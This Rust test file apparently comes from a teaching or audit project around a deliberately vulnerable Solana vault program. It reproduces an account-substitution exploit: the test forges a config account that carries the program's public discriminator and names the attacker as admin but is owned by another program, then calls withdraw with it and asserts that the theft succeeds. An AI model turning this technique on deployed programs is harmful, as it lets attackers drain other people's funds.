use anchor_lang::solana_program::system_program;
use anchor_lang::{Discriminator, InstructionData};
use litesvm::LiteSVM;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};

use leaky_vault::Config;

/// Boot a VM with the compiled program loaded.
fn setup() -> LiteSVM {
    let mut svm = LiteSVM::new();
    svm.add_program(
        leaky_vault::ID,
        include_bytes!("../../../target/deploy/leaky_vault.so"),
    )
    .unwrap();
    svm
}

#[test]
fn attack_drains_vault() {
    let mut svm = setup();

    // `Config::DISCRIMINATOR` is public, so an attacker can prepend the
    // same 8 bytes Anchor uses. The forged account deserializes cleanly.
    let attacker = Keypair::new();
    svm.airdrop(&attacker.pubkey(), 1_000_000_000).unwrap();

    let mut forged_data = Vec::new();
    forged_data.extend_from_slice(Config::DISCRIMINATOR);
    forged_data.extend_from_slice(attacker.pubkey().as_ref()); // admin = attacker

    let fake_config = Pubkey::new_unique();
    svm.set_account(
        fake_config,
        Account {
            lamports: 1_000_000,
            data: forged_data,
            owner: system_program::ID, // NOT the vault program
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();

    // Build `withdraw`, passing the forged config and the attacker as signer.
    let ix = Instruction {
        program_id: leaky_vault::ID,
        accounts: vec![
            AccountMeta::new_readonly(fake_config, false),
            AccountMeta::new(attacker.pubkey(), true),
        ],
        data: leaky_vault::instruction::Withdraw { _amount: 0 }.data(),
    };

    let tx = Transaction::new_signed_with_payer(
        &[ix],
        Some(&attacker.pubkey()),
        &[&attacker],
        svm.latest_blockhash(),
    );

    // On the vulnerable build, this SUCCEEDS. That green result is the theft.
    let result = svm.send_transaction(tx);
    assert!(result.is_ok(), "exploit failed to reproduce");
}
